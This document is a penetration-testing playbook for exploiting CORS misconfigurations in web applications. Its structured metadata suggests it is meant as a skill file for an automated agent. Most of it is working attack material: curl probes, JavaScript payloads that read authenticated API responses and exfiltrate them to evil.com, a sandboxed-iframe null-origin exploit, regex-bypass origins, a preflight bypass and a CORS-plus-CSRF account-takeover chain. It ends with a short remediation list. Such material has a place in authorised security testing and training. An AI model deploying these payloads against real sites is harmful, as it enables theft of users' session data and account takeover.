# CORS Misconfiguration — Skill Playbook

**Mitre ATT&CK ID:** T1204.001 (User Execution: Malicious Link)
**OWASP Mapping:** A05:2021 – Security Misconfiguration
**Severity:** High / Medium
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: cors-misconfiguration-v1
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1204.001
owasp_mapping:
  - A05:2021-SecurityMisconfiguration
tags:
  - cors
  - origin
  - acao
  - credentials
  - web-application
  - T1204.001
  - csrf-chain
environments:
  - web
  - browser
  - api
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Origin Reflection Testing

Send an arbitrary `Origin` header and check the response:
```bash
curl -sI -H "Origin: https://evil.com" "https://target.com/api/user" \
  | grep -iE "access-control"
# access-control-allow-origin: https://evil.com       -> reflected
# access-control-allow-origin: *                      -> wildcard
# access-control-allow-origin: null                   -> null origin
# no ACAO header at all                                -> not vulnerable
```

### 1.2 What to Fetch Cross-Origin

- Authenticated endpoints returning sensitive JSON (`/api/me`, `/account`, `/invoices`)
- GraphQL queries
- Admin APIs / dashboards
- Session-sensitive data behind cookies

### 1.3 Check `Access-Control-Allow-Credentials`

```bash
curl -s -H "Origin: https://evil.com" -b "session=AAA" "https://target.com/api/me" \
  | grep -iE "access-control-allow-(origin|credentials)"
# access-control-allow-credentials: true AND reflected origin
# -> exploitable with cookies
```

---

## 2. Confirmation

### 2.1 Reflection Confirmation

```bash
# Custom origin echoed back
curl -sI -H "Origin: https://attacker.example" "https://target.com/api/user"
# access-control-allow-origin: https://attacker.example
# access-control-allow-credentials: true

# If ACAO is * with credentials: true  -> broken implementation, still exploitable
# (browsers refuse *+credentials, but vulnerable if server reflects alongside)
```

### 2.2 `null` Origin Confirmation

```bash
curl -sI -H "Origin: null" "https://target.com/api/user" | grep -i access-control
# ACAO: null + credentials true -> exploitable via sandboxed iframe
```

---

## 3. Exploitation

### 3.1 Data Theft via Origin Reflection

When the server reflects any Origin and sets `Allow-Credentials: true`, any malicious page can read authenticated responses:

```html
<script>
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r => r.json())
  .then(d => new Image().src = 'https://evil.com/c?data=' + JSON.stringify(d));
</script>
```

### 3.2 `null` Origin Exploit (sandboxed iframe)

`Origin: null` is sent by sandboxed iframes, data: URLs and redirected requests:

```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>
fetch('https://target.com/api/me',{credentials:'include'})
  .then(r=>r.text())
  .then(d=>location='https://evil.com/?d='+encodeURIComponent(d))
<\/script>"></iframe>
```

### 3.3 Subdomain Trust Abuse

If `ACAO` is a regex over `target.com` subdomains, host a page on any trusted subdomain (`staging.target.com`) you control, then read `https://target.com/api/me` from it.

Regex bypass payloads for sloppy matching:
```
https://target.com.evil.com
https://evil-target.com
https://target.com@evil.com
https://target.com.evil.com (regex "target.com")
```

### 3.4 Preflight Bypass

- Simple requests (GET, POST with `text/plain`, form `application/x-www-form-urlencoded`) skip preflight
- `fetch` with `credentials:'include'` and default headers is a simple request on many endpoints
- If the endpoint rejects JSON content-type but accepts `text/plain`, send JSON inside `text/plain` to avoid preflight

### 3.5 CORS + CSRF Chain

1. CSRF forces a state change (e.g. add attacker SSH key, change email)
2. CORS lets the attacker read the confirmation response, including new tokens/keys
3. Combine both in a single payload page for full account takeover

---

## 4. Tool-Specific Guidance

### 4.1 Manual curl-based testing

```bash
for o in "https://evil.com" "null" "https://target.com.evil.com" "https://evil.com@target.com"; do
  echo "== Origin: $o"
  curl -sI -H "Origin: $o" -b "session=AAA" "https://target.com/api/me" \
    | grep -iE "access-control|HTTP/"
done
```

### 4.2 Burp Suite + CORScanner

```bash
# CORScanner (Python) — batch CORS scan
python3 cors_scan.py -u https://target.com/api/me --headers "Cookie: session=AAA"

# Burp: send base request to Repeater, modify Origin per variant, check ACAO
```

### 4.3 Nuclei CORS templates

```bash
nuclei -u https://target.com -t ~/nuclei-templates/http/misconfiguration/cors/ -jsonl cors.jsonl
```

### 4.4 Browser verification

- Use a sandbox browser with an attacker-controlled origin page
- Confirm the fetch reads the response (not a blocked CORS console error)

---

## 5. PoC Generation

### PoC Template

```markdown
## CORS Misconfiguration — [FINDING_ID]

**URL:** https://target.com/api/me
**Origin reflected:** YES / Null / Subdomain-only
**Access-Control-Allow-Credentials:** true / false

### Payload
```html
<script>
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => new Image().src = 'https://evil.com/?d=' + encodeURIComponent(d));
</script>
```

### Evidence
```
Request with Origin: https://evil.com
Response: access-control-allow-origin: https://evil.com
         access-control-allow-credentials: true
```

### Impact
- Sensitive data theft: YES/NO
- API key / session token exposure: YES/NO
- CSRF chain: YES/NO

### Remediation
- Allow-list exact trusted origins server-side; never reflect `Origin`
- Do not combine `*` with `Allow-Credentials`
- Reject `null` origin unless required
- Validate on server (not via regex on the Origin header)

### Reproduction Steps
1. Send request with `Origin: https://evil.com`
2. Observe reflection + credentials header
3. Host PoC page, victim visits, data exfiltrated
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Reflection verified for each Origin variant
- [ ] Credentials flag confirmed present and combined with reflection
- [ ] PoC executed only in sandbox browser against sandbox API
- [ ] No victim interaction outside controlled environment
- [ ] Regex bypass variants enumerated before reporting

---

## 7. Cheat Sheet/Reference

| Test | Request header | Vulnerable response |
|---|---|---|
| Reflection | `Origin: https://evil.com` | `ACAO: https://evil.com` + credentials |
| Wildcard | default | `ACAO: *` (no credentials) |
| Null | `Origin: null` | `ACAO: null` + credentials |
| Subdomain | `Origin: https://evil.target.com` | `ACAO: https://evil.target.com` |
| Regex bypass | `Origin: https://target.com.evil.com` | reflected |
| Credentials | `Origin: <reflected>` | `Access-Control-Allow-Credentials: true` |
| Preflight | `OPTIONS` request | `Access-Control-Allow-Methods/Headers` |
| Simple request | `fetch(...,{credentials:'include'})` | no preflight needed |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1204.001 | User Execution: Malicious Link | Victim opens PoC |
| T1189 | Drive-by Compromise | Silent data theft |
| T1539 | Steal Web Session Cookie | Session/API token theft |
| T1185 | Browser Session Hijacking | Authenticated data read |
| T1059.007 | JavaScript | Exfiltration logic |

---

## 9. References

- PayloadsAllTheThings CORS Misconfiguration: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- HackTricks CORS Bypass: https://book.hacktricks.xyz/pentesting-web/cors-bypass
- PortSwigger CORS: https://portswigger.net/web-security/cors
- MDN CORS: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
